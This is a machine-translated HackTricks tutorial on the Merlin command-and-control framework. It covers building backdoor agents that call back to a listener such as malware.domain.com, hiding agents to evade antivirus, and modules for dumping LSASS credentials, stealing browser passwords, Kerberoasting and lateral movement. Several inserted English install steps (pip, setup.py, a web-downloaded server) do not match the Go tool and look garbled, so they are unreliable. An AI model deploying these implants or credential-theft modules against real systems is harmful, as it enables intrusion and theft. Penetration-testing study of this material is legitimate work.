<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 安装

## 安装GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## 安装Merlin

To install Merlin, follow these steps:

1. Clone the Merlin repository from GitHub:

   ```
   git clone https://github.com/Ne0nd0g/merlin.git
   ```

2. Change into the Merlin directory:

   ```
   cd merlin
   ```

3. Install the required dependencies:

   ```
   pip install -r requirements.txt
   ```

4. Run the setup script:

   ```
   python setup.py install
   ```

5. Verify that Merlin is installed correctly by running the following command:

   ```
   merlin --help
   ```

   If you see the help menu, then Merlin is installed successfully.

Congratulations! You have successfully installed Merlin on your system. You can now proceed to use its powerful backdoor capabilities for your penetration testing activities.
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# 启动Merlin服务器

To launch the Merlin server, follow these steps:

1. Download the Merlin server package from the official website.
2. Extract the contents of the package to a directory of your choice.
3. Open a terminal or command prompt and navigate to the directory where you extracted the package.
4. Run the following command to start the Merlin server:

   ```bash
   ./merlin-server
   ```

   If you encounter any permission issues, you may need to use `sudo` or run the command as an administrator.

5. The Merlin server should now be running and listening for incoming connections on the default port (usually 8080). You can access the server by opening a web browser and entering the server's IP address followed by the port number.

   For example: `http://192.168.0.1:8080`

   Note: Make sure to replace `192.168.0.1` with the actual IP address of your Merlin server.

6. You will be prompted to set up an initial admin account and configure other settings. Follow the on-screen instructions to complete the setup process.

Congratulations! You have successfully launched the Merlin server. You can now use it to manage and control your backdoor implants.
```
go run cmd/merlinserver/main.go -i
```
# Merlin代理

您可以[下载预编译的代理](https://github.com/Ne0nd0g/merlin/releases)

## 编译代理

转到主文件夹 _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **手动编译代理程序**

In some cases, you may need to manually compile an agent program to create a custom backdoor. This can be useful when you want to avoid detection by antivirus software or when you need to tailor the backdoor to specific requirements.

以下是手动编译代理程序的步骤：

1. **选择合适的编程语言**：选择一种适合你的需求的编程语言，如C、C++、Python等。

2. **编写代理程序代码**：根据你的需求编写代理程序的代码。确保代码实现了所需的功能，如远程访问、文件传输等。

3. **编译代理程序**：使用编程语言的编译器将代理程序代码编译成可执行文件。确保编译过程没有错误。

4. **测试代理程序**：在安全环境中测试代理程序，确保它按预期工作并没有引起异常。

5. **隐藏代理程序**：使用技术手段将代理程序隐藏在合法的文件或进程中，以避免被检测到。

6. **部署代理程序**：将编译好的代理程序部署到目标系统中，并确保它能够在后台运行。

请注意，手动编译代理程序需要一定的编程和系统知识。在进行此操作时，请确保你有合法的授权，并遵守法律和道德规范。
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# 模块

**坏消息是，Merlin使用的每个模块都是从源代码（Github）下载并保存在磁盘上，然后再使用。在使用知名模块时要小心，因为Windows Defender会发现你！**


**SafetyKatz** --> 修改版的Mimikatz。将LSASS转储到文件并启动：sekurlsa::logonpasswords以将其写入该文件\
**SharpDump** --> 为指定的进程ID进行minidump（默认为LSASS）（最终文件的扩展名是.gz，但实际上是.bin，但是是一个gz文件）\
**SharpRoast** --> Kerberoast（不起作用）\
**SeatBelt** --> CS中的本地安全性测试（不起作用）https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> 使用csc.exe /unsafe进行编译\
**Sharp-Up** --> 在powerup中使用C#进行所有检查（起作用）\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS欺骗和中间人工具（不起作用，需要加载：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
**Invoke-InternalMonologue** --> 模拟所有可用用户并为每个用户检索挑战-响应（每个用户的NTLM哈希）（错误的URL）\
**Invoke-PowerThIEf** --> 从IExplorer窃取表单或使其执行JS或在该进程中注入DLL（不起作用）（而且PS看起来也不起作用）https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> 获取浏览器密码（起作用，但不打印输出目录）\
**dumpCredStore** --> Win32凭据管理器API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1）https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> 检测正在运行的进程中的经典注入（经典注入（OpenProcess，VirtualAllocEx，WriteProcessMemory，CreateRemoteThread））（不起作用）\
**Get-OSTokenInformation** --> 获取正在运行的进程和线程的令牌信息（用户、组、特权、所有者...https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-_token_information_class）\
**Invoke-DCOM** --> 通过DCOM在其他计算机上执行命令（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> 滥用PowerPoint COM对象（ADDin）在其他计算机上执行命令\
**Invoke-ExcelMacroPivot** --> 滥用Excel中的DCOM在其他计算机上执行命令\
**Find-ComputersWithRemoteAccessPolicies** -->（不起作用）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
**Grouper** --> 它转储了组策略的所有最有趣的部分，然后在其中寻找可利用的东西。（已弃用）看看Grouper2，看起来非常好\
**Invoke-WMILM** --> 使用WMI进行横向移动\
**Get-GPPPassword** --> 查找groups.xml、scheduledtasks.xml、services.xml和datasources.xml并返回明文密码（在域内）\
**Invoke-Mimikatz** --> 使用mimikatz（默认转储凭证）\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> 检查计算机上用户的特权\
**Find-PotentiallyCrackableAccounts** --> 检索与SPN关联的用户帐户的信息（Kerberoasting）\
**psgetsystem** --> getsystem

**没有检查持久性模块**

# 简介

我真的很喜欢这个工具的感觉和潜力。\
我希望工具能够从服务器下载模块并在下载脚本时集成某种逃避机制。


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧。**

</details>
